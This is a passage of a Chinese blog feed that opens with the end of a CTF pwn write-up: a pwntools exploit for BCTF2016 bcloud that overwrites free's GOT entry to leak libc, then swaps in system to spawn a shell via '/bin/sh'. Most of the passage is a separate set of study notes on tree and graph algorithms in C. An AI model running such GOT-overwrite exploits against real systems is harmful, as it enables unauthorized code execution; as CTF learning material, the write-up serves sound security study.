class="number">1</span>,p32(<span class="number">0</span>) + p32(free_got) + p32(puts_got) + p32(<span class="number">0x0804B130</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#修改free的got表为puts的plt表</span></span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露puts的地址</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.recv(<span class="number">1</span>)</span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#修改free的got表为system地址</span></span><br><span class="line">edit(<span class="number">1</span>,p32(system_addr) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/seaaseesa/article/details/105588058?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2.pc_relevant_default&amp;utm_relevant_index=3">参考文章</a></p><p><a href="https://snappyjack.github.io/articles/2019-12/BCTF2016_bcloud">https://snappyjack.github.io/articles/2019-12/BCTF2016_bcloud</a></p><p><a href="https://blog.csdn.net/csdn546229768/article/details/122725993">https://blog.csdn.net/csdn546229768/article/details/122725993</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构基础代码总结（树和图）</title>
      <link href="/2022/02/17/%E3%80%90%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E3%80%91%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E4%BB%A3%E7%A0%81%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93%20C%E8%AF%AD%E8%A8%80(%E6%A0%91%E5%92%8C%E5%9B%BE%EF%BC%89/"/>
      <url>/2022/02/17/%E3%80%90%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E3%80%91%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E4%BB%A3%E7%A0%81%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93%20C%E8%AF%AD%E8%A8%80(%E6%A0%91%E5%92%8C%E5%9B%BE%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>树和图部分</p><span id="more"></span><h1 id="一-树和二叉树"><a class="markdownIt-Anchor" href="#一-树和二叉树">#</a> 一、树和二叉树</h1><h2 id="树的遍历"><a class="markdownIt-Anchor" href="#树的遍历">#</a> 树的遍历</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> &#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>, *<span class="title">rchild</span>;</span></span><br><span class="line">&#125; BiTNode, *BiTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//先序遍历</span></span><br><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>) &#123;</span><br><span class="line">visit(T);</span><br><span class="line">PreOrder(T-&gt;lchild);</span><br><span class="line">PreOrder(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreOrder2</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line">InitStack(S);</span><br><span class="line">BiTree p = T;</span><br><span class="line"><span class="keyword">while</span> (p || !IsEmpty(S)) &#123;</span><br><span class="line"><span class="keyword">if</span> (p) &#123;</span><br><span class="line">visit(p);</span><br><span class="line">Push(S, p);</span><br><span class="line">p = p-&gt;lchild;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Pop(S, p);</span><br><span class="line">p = p-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>) &#123;</span><br><span class="line">InOrder(T-&gt;lchild);</span><br><span class="line">visite(T);</span><br><span class="line">InOrder(T-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//非递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder2</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line">InitStack(S);</span><br><span class="line">BiTree p = T;</span><br><span class="line"><span class="keyword">while</span> (p || !IsImpty(S)) &#123;</span><br><span class="line"><span class="keyword">if</span> (p) &#123;</span><br><span class="line">push(S, p);</span><br><span class="line">p = p-&gt;lchild;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Pop(S, p);</span><br><span class="line">visit(p);</span><br><span class="line">p = p-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后序遍历</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>) &#123;</span><br><span class="line">PostOrder(T-&gt;lchild);</span><br><span class="line">PostOrder(T-&gt;rchild);</span><br><span class="line">visit(T);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//层次遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BiTree T)</span> &#123;</span><br><span class="line">InitQueue(Q);</span><br><span class="line">BiTree p;</span><br><span class="line">EnQueue(Q, T);</span><br><span class="line"><span class="keyword">while</span> (!Empty(Q)) &#123;</span><br><span class="line">DeQueue(Q, p);</span><br><span class="line">visit(p);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">EnQueue(Q, p-&gt;lchild);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">EnQueue(Q, p-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线索二叉树"><a class="markdownIt-Anchor" href="#线索二叉树">#</a> 线索二叉树</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> &#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ThreadNode</span> *<span class="title">lchild</span>, *<span class="title">rchild</span>;</span></span><br><span class="line"><span class="type">int</span> ltag, rtag;</span><br><span class="line">&#125; ThreadNode, *ThreadTree;</span><br><span class="line"></span><br><span class="line"><span class="comment">//中序线索二叉树</span></span><br><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InThread</span><span class="params">(ThreadTree &amp;p, ThreadTree &amp;pre)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">InThread(p-&gt;lchild, pre);<span class="comment">//递归，线索化左子树</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;lchild == <span class="literal">NULL</span>) &#123;<span class="comment">//左子树为空，建立前驱线索</span></span><br><span class="line">p-&gt;lchild = pre;</span><br><span class="line">p-&gt;ltag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pre != <span class="literal">NULL</span> &amp;&amp; pre-&gt;rchild == <span class="literal">NULL</span>) &#123;</span><br><span class="line">pre-&gt;rchild = p; <span class="comment">//建立前驱节点的后继线索</span></span><br><span class="line">pre-&gt;rtag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">pre = p;<span class="comment">//标记当前结点为刚刚访问过的结点</span></span><br><span class="line">InThread(p-&gt;rchild, pre);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreatInThread</span><span class="params">(ThreadTree T)</span> &#123;</span><br><span class="line">ThreadTree pre = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (T != <span class="literal">NULL</span>) &#123;</span><br><span class="line">InThead(T, pre);</span><br><span class="line">pre-&gt;rchild = <span class="literal">NULL</span>; <span class="comment">//处理遍历的最后一个结点</span></span><br><span class="line">pre-&gt;rtag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历"><a class="markdownIt-Anchor" href="#遍历">#</a> 遍历</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//中序线索树的遍历</span></span><br><span class="line">ThreadNode *<span class="title function_">Firstnode</span><span class="params">(ThreadNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(p-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">p=p-&gt;lchild;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line">ThreadNode *<span class="title function_">Nextnode</span><span class="params">(ThreadNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;rtag==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> Firstnode(p-&gt;rchild);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> p-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不含头结点的中序线索树的中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Inorder</span><span class="params">(ThreadNode *T)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(ThreadNode *p=Firstnode(T);p!=<span class="literal">NULL</span>;p=Nextnode(p))</span><br><span class="line">visit(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二-图"><a class="markdownIt-Anchor" href="#二-图">#</a> 二、图</h1><h2 id="bfs"><a class="markdownIt-Anchor" href="#bfs">#</a> BFS</h2><p>广度优先搜索<br>主要使用队列实现，对每个节点可能到达的路径进行入队出队判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxVertexNum 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> VertexType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> EdgeType;</span><br><span class="line"><span class="type">int</span> Max = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">VertexType Vex[MaxVertexNum];</span><br><span class="line">EdgeType EdgeType[MaxVertexNum][MaxVertexNum];</span><br><span class="line"><span class="type">int</span> vexnum, arcnum;</span><br><span class="line">&#125; Gragh;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BFS遍历</span></span><br><span class="line"><span class="type">bool</span> visited[MaxVertexNum];</span><br><span class="line"><span class="type">void</span> <span class="title function_">BFSTraverse</span><span class="params">(Graph G)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G.vexnum; ++i)</span><br><span class="line">visited[i] = <span class="literal">false</span>;</span><br><span class="line">InitQueue(Q);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G.vexnum; ++i)</span><br><span class="line"><span class="keyword">if</span> (!visited[i])</span><br><span class="line">BFS(G, i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(Graph G, <span class="type">int</span> v)</span> &#123;</span><br><span class="line">visit(v);</span><br><span class="line">visited[v] = <span class="literal">true</span>;</span><br><span class="line">Enqueue(Q, v);</span><br><span class="line"><span class="keyword">while</span> (!isEmpty(Q)) &#123;</span><br><span class="line">DeQueue(Q, v);</span><br><span class="line"><span class="keyword">for</span> (w = FirstNeighbor(G, v); w &gt;= <span class="number">0</span>; w = NextNeighbor(G, v, w))</span><br><span class="line"><span class="keyword">if</span> (!visited[w]) &#123;</span><br><span class="line">visit(w);</span><br><span class="line">visited[w] = <span class="literal">true</span>;</span><br><span class="line">EnQueue(Q, w);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BFS求单源最短路径</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS_MIN_Distance</span><span class="params">(Graph G, <span class="type">int</span> u)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G.vexnum; i++)</span><br><span class="line">d[i] = Max; <span class="comment">//初始化路径为无穷</span></span><br><span class="line">visited[u] = <span class="literal">true</span>;</span><br><span class="line">d[u] = <span class="number">0</span>;</span><br><span class="line">EnQueue(Q, u);</span><br><span class="line"><span class="keyword">while</span> (!isEmpty(Q)) &#123;</span><br><span class="line">DeQueue(Q, u);</span><br><span class="line"><span class="keyword">for</span> (w = FirstNeighbor(G, u); w &gt;= <span class="number">0</span>; w = NextNeighbor(G, u, w))</span><br><span class="line"><span class="keyword">if</span> (!visited[w]) &#123;</span><br><span class="line">visited[w] = <span class="literal">true</span>;</span><br><span class="line">d[w] = d[u] + <span class="number">1</span>;</span><br><span class="line">EnQueue(Q, w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dfs"><a class="markdownIt-Anchor" href="#dfs">#</a> DFS</h2><p>深度优先搜索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> visited[MAX_VERTEX_NUM];</span><br><span class="line"><span class="type">void</span> <span class="title function_">DFSTraverse</span><span class="params">(Graph G)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)</span><br><span class="line">visited[v]=FALSE;</span><br><span class="line"><span class="keyword">for</span>(v=<span class="number">0</span>;v&lt;G.vexnum;++v)</span><br><span class="line"><span class="keyword">if</span>(!visited[v])</span><br><span class="line">DFS(G,v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(Graph G,<span class="type">int</span> v)</span>&#123;</span><br><span class="line">visit(v);</span><br><span class="line">visited[v]=TRUE;</span><br><span class="line"><span class="keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="number">0</span>;w=NextNeighbor(G,v,w))</span><br><span class="line"><span class="keyword">if</span>(!visited[w])&#123;</span><br><span class="line">DFS(G,w);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最小生成树"><a class="markdownIt-Anchor" href="#最小生成树">#</a> 最小生成树</h2><p>关于图的几个概念定义：</p><p>连通图：在无向图中，若任意两个顶点 vivi 与 vjvj 都有路径相通，则称该无向图为连通图。<br>强连通图：在有向图中，若任意两个顶点 vivi 与 vjvj 都有路径相通，则称该有向图为强连通图。<br>连通网：在连通图中，若图的边具有一定的意义，每一条边都对应着一个数，称为权；权代表着连接连个顶点的代价，称这种连通图叫做连通网。<br>生成树：一个连通图的生成树是指一个连通子图，它含有图中全部 n 个顶点，但只有足以构成一棵树的 n-1 条边。一颗有 n 个顶点的生成树有且仅有 n-1 条边，如果生成树中再添加一条边，则必定成环。<br>最小生成树：在连通网的所有生成树中，所有边的代价和最小的生成树，称为最小生成树。<br><img src="https://img-blog.csdnimg.cn/fdf5fd6eddf14303bd46908ad82e99db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>下面介绍两种求最小生成树算法</p><p>1.Kruskal 算法<br>此算法可以称为 “加边法”，初始最小生成树边数为 0，每迭代一次就选择一条满足条件的最小代价边，加入到最小生成树的边集合里。</p><p>把图中的所有边按代价从小到大排序；<br>把图中的 n 个顶点看成独立的 n 棵树组成的森林；<br>按权值从小到大选择边，所选的边连接的两个顶点 ui,viui,vi, 应属于两颗不同的树，则成为最小生成树的一条边，并将这两颗树合并作为一颗树。<br>重复 (3), 直到所有顶点都在一颗树内或者有 n-1 条边为止。<br><img src="https://img-blog.csdnimg.cn/fc55c29aced344ce87a732de52f532ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ol start="2"><li>Prim 算法<br>此算法可以称为 “加点法”，每次迭代选择代价最小的边对应的点，加入到最小生成树中。算法从某一个顶点 s 开始，逐渐长大覆盖整个连通网的所有顶点。</li></ol><p>图的所有顶点集合为 VV；初始令集合 u={s},v=V−uu={s},v=V−u;<br> 在两个集合 u,vu,v 能够组成的边中，选择一条代价最小的边 (u0,v0)(u0,v0)，加入到最小生成树中，并把 v0v0 并入到集合 u 中。<br>重复上述步骤，直到最小生成树有 n-1 条边或者 n 个顶点为止。<br>由于不断向集合 u 中加点，所以最小代价边必须同步更新；需要建立一个辅助数组 closedge, 用来维护集合 v 中每个顶点与集合 u 中最小代价边信息，：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> vertexData   <span class="comment">//表示u中顶点信息</span></span><br><span class="line">  UINT lowestcost   <span class="comment">//最小代价</span></span><br><span class="line">&#125;closedge[vexCounts]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d2ea71d69253474893ef97e8dfd6d1d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="prim算法"><a class="markdownIt-Anchor" href="#prim算法">#</a> Prim 算法</h3><p>最小生成树是一个图的极小连通子图，它包含原图的所有顶点，并且所有边的权值之和尽可能小。</p><p>Prim 算法就是图的最小生成树算法之一，Prim 算法是一种求解加权无向连通图的 MST 问题的贪心算法。它能找出一个边的子集，使得其构成的树包含图中所有顶点，且边的权值之和最小。</p><p>Prim 算法以图的顶点为基础，从首个初始顶点，寻找到达其他顶点权值最小的边，并把该顶点加入到 “ <code>已到达顶点</code> ” 的集合中，此时，这个集合就是这个图的最小生成树。</p><p>一般用一维数组比较方便表达最小生成树，数组下标所对应的元素，代表该顶点在最小生成树当中的父亲节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基于Prim算法实现最小生成树</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">1e7</span>;</span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt; Init() &#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入带权无向图的定点数和边数(以空格隔开):&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt; graph(n+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n+<span class="number">1</span>, INF));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请依次输入&quot;</span> &lt;&lt; m &lt;&lt; <span class="string">&quot;条边的开始节点，结束节点，权值(以空格隔开):&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="type">int</span> start, end, wet;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; start &gt;&gt; end &gt;&gt; wet;</span><br><span class="line">        graph[start][end] = wet;</span><br><span class="line">        graph[end][start] = wet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> graph;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Prim</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt;&amp; c, <span class="type">int</span> u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> n = c.size() - <span 